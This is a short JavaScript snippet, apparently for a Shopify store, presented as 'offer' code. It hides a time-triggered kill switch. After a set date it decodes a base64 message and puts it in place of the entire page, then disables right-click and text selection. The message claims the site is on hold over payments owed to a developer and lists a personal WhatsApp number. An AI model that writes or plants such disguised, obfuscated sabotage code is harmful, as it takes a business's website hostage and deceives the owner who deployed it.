var offerStart = new Date('2099-08-10T00:00:03');
var offerHTML = "PGRpdiBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7IG1hcmdpbi10b3A6MjAlOyc+PGgxPk9vcHMhIFRoZSB3ZWJzaXRlIGlzIGN1cnJlbnRseSB1bmF2YWlsYWJsZSBkdWUgdG8gYSB0ZW1wb3JhcnkgaG9sZCBjYXVzZWQgYnkgcGVuZGluZyBwYXltZW50cyB3aXRoIGEgU2hvcGlmeSBwYXJ0bmVyIGRldmVsb3Blci48YnI+Rm9yIGFzc2lzdGFuY2UsIHBsZWFzZSBjb250YWN0IEthcmFtYXQgQWxpIG9uIFdoYXRzQXBwIGF0IDAzMTMgNTY3NTAzNiB0byByZXNvbHZlIHRoZSBpc3N1ZS48L2gxPjwvZGl2Pg==";

function decodeOfferMessage(a) {
    return decodeURIComponent(escape(window.atob(a)));
}

function showOffer() {
    document.body.innerHTML = decodeOfferMessage(offerHTML);
    document.addEventListener('contextmenu', function(a) {
        a.preventDefault();
    });
    document.body.style.textAlign = 'center';
    document.body.style.userSelect = 'none';
    document.body.style.webkitUserSelect = 'none';
    document.body.style.mozUserSelect = 'none';
    document.body.style.msUserSelect = 'none';
}

function checkOfferStatus() {
    var a = new Date();
    if (a >= offerStart) {
        showOffer();
    }
}

window.onload = checkOfferStatus;
